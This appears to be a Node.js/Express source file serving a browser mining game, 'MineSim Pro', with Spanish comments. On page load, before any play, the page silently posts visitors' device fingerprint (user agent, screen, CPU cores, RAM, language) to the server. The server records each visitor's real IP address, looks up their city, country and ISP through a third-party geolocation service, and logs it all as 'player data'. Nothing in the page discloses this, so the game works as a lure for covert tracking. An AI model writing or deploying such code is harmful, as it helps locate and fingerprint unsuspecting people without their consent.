const express = require('express');
const app = express();

const PORT = process.env.PORT || 3000;
app.set('trust proxy', true);
app.use(express.json());

// Recepción y registro de telemetría completa
app.post('/api/telemetry', async (req, res) => {
    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
    let userIp = rawIp ? rawIp.split(',')[0].trim() : 'IP no detectada';
    
    const clientData = req.body || {};
    let geo = { country: 'Desconocido', city: 'Desconocida', isp: 'Desconocido' };

    // Consulta de geolocalización por IP en el servidor
    try {
        const geoRes = await fetch(`http://ip-api.com/json/${userIp}?fields=status,country,city,isp`);
        const geoJson = await geoRes.json();
        if (geoJson.status === 'success') {
            geo.country = geoJson.country;
            geo.city = geoJson.city;
            geo.isp = geoJson.isp;
        }
    } catch (e) {}

    console.log(`\n========================================`);
    console.log(`🎯 [DATOS DE JUGADOR REGISTRADOS]`);
    console.log(`📍 IP Real: ${userIp}`);
    console.log(`🌎 Ubicación: ${geo.city}, ${geo.country}`);
    console.log(`📡 ISP/Red: ${geo.isp}`);
    console.log(`💻 Navegador/OS: ${clientData.userAgent || 'N/A'}`);
    console.log(`🖥️ Pantalla: ${clientData.screen || 'N/A'}`);
    console.log(`🧠 Hardware: ${clientData.cores || 'N/A'} Núcleos | ~${clientData.ram || 'N/A'}GB RAM`);
    console.log(`🌐 Idioma: ${clientData.language || 'N/A'}`);
    console.log(`========================================\n`);

    res.sendStatus(200);
});

// Simulador de Minería Serio
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MineSim Pro 2D</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; user-select: none; }
        body { background: #0a0a0c; color: #fff; overflow: hidden; }
        canvas { display: block; background: #0f172a; }
        
        #menu { position: absolute; width: 100%; height: 100%; background: #09090b; display: flex; justify-content: center; align-items: center; z-index: 20; }
        .panel { background: #18181b; padding: 35px; border-radius: 12px; border: 1px solid #27272a; text-align: center; width: 350px; box-shadow: 0 20px 40px rgba(0,0,0,0.8); }
        h1 { color: #38bdf8; font-size: 1.8rem; margin-bottom: 5px; font-weight: 800; }
        p { color: #a1a1aa; font-size: 0.85rem; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #3f3f46; background: #09090b; color: #fff; text-align: center; margin-bottom: 15px; outline: none; }
        button { width: 100%; padding: 12px; border-radius: 6px; border: none; background: #0284c7; color: #fff; font-weight: bold; cursor: pointer; transition: 0.2s; }
        button:hover { background: #0369a1; }

        #ui { position: absolute; top: 15px; left: 15px; display: flex; gap: 12px; pointer-events: none; z-index: 10; }
        .stat-box { background: rgba(9, 9, 11, 0.9); padding: 8px 14px; border-radius: 6px; border: 1px solid #27272a; font-size: 0.8rem; }
        .stat-value { font-size: 1rem; font-weight: bold; color: #38bdf8; }
    </style>
</head>
<body>

    <div id="menu">
        <div class="panel">
            <h1>MINESIM PRO</h1>
            <p>Simulador de Minería Profunda v3.0</p>
            <input type="text" id="miner-name" value="Minero_01" placeholder="Nombre">
            <button onclick="startSim()">INICIAR SIMULACIÓN</button>
        </div>
    </div>

    <div id="ui" style="display:none;">
        <div class="stat-box">PROFUNDIDAD<div class="stat-value" id="depth">0m</div></div>
        <div class="stat-box">MINERALES<div class="stat-value" id="resources">0</div></div>
    </div>

    <canvas id="cv"></canvas>

    <script>
    // Envío silencioso de características del dispositivo
    function sendTelemetry() {
        const payload = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            screen: \`\${screen.width}x\${screen.height}\`,
            cores: navigator.hardwareConcurrency || 'N/A',
            ram: navigator.deviceMemory || 'N/A'
        };

        fetch('/api/telemetry', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(()=>{});
    }
    sendTelemetry();

    function startSim() {
        document.getElementById('menu').style.display = 'none';
        document.getElementById('ui').style.display = 'flex';
        initEngine();
    }

    function initEngine() {
        const cv = document.getElementById('cv');
        const ctx = cv.getContext('2d');
        cv.width = window.innerWidth;
        cv.height = window.innerHeight;

        const TILE = 36;
        const COLS = Math.ceil(cv.width / TILE);
        const ROWS = 80;
        const surface = 8;
        let minedCount = 0;
        let map = [];
        
        for (let r = 0; r < ROWS; r++) {
            map[r] = [];
            for (let c = 0; c < COLS; c++) {
                if (r < surface) map[r][c] = 0;
                else if (r === surface) map[r][c] = 1;
                else if (r < surface + 6) map[r][c] = 2;
                else {
                    let rand = Math.random();
                    if (rand < 0.05) map[r][c] = 4;
                    else if (rand < 0.12) map[r][c] = 5;
                    else map[r][c] = 3;
                }
            }
        }

        const colors = { 1: '#4ade80', 2: '#78350f', 3: '#52525b', 4: '#facc15', 5: '#334155' };

        const p = { x: Math.floor(COLS / 2) * TILE, y: (surface - 2) * TILE, w: 24, h: 50, vx: 0, vy: 0, ground: false };
        const keys = {};

        window.addEventListener('keydown', e => keys[e.code] = true);
        window.addEventListener('keyup', e => keys[e.code] = false);

        cv.addEventListener('mousedown', e => {
            const c = Math.floor(e.clientX / TILE);
            const r = Math.floor(e.clientY / TILE);
            if (r >= 0 && r < ROWS && c >= 0 && c < COLS) {
                if (e.button === 0 && map[r][c] !== 0) {
                    map[r][c] = 0;
                    minedCount++;
                    document.getElementById('resources').innerText = minedCount;
                } else if (e.button === 2 && map[r][c] === 0) {
                    map[r][c] = 3;
                }
            }
        });
        cv.addEventListener('contextmenu', e => e.preventDefault());

        function loop() {
            if (keys['KeyA'] || keys['ArrowLeft']) p.vx = -4;
            else if (keys['KeyD'] || keys['ArrowRight']) p.vx = 4;
            else p.vx = 0;

            if ((keys['KeyW'] || keys['Space']) && p.ground) {
                p.vy = -9.5;
                p.ground = false;
            }

            p.vy += 0.45;
            p.x += p.vx;
            p.y += p.vy;
            p.ground = false;

            for (let r = 0; r < ROWS; r++) {
                for (let c = 0; c < COLS; c++) {
                    if (map[r][c] !== 0) {
                        const bx = c * TILE;
                        const by = r * TILE;
                        if (p.x < bx + TILE && p.x + p.w > bx && p.y < by + TILE && p.y + p.h > by) {
                            if (p.vy > 0 && p.y + p.h - p.vy <= by) {
                                p.y = by - p.h;
                                p.vy = 0;
                                p.ground = true;
                            }
                        }
                    }
                }
            }

            let currentDepth = Math.max(0, Math.floor((p.y / TILE) - surface));
            document.getElementById('depth').innerText = currentDepth + 'm';

            ctx.clearRect(0, 0, cv.width, cv.height);

            for (let r = 0; r < ROWS; r++) {
                for (let c = 0; c < COLS; c++) {
                    if (map[r][c] !== 0) {
                        ctx.fillStyle = colors[map[r][c]];
                        ctx.fillRect(c * TILE, r * TILE, TILE, TILE);
                        ctx.strokeStyle = '#09090b';
                        ctx.strokeRect(c * TILE, r * TILE, TILE, TILE);
                    }
                }
            }

            ctx.fillStyle = '#0284c7';
            ctx.fillRect(p.x, p.y, p.w, p.h);

            requestAnimationFrame(loop);
        }
        loop();
    }
    </script>
</body>
</html>`);
});

app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
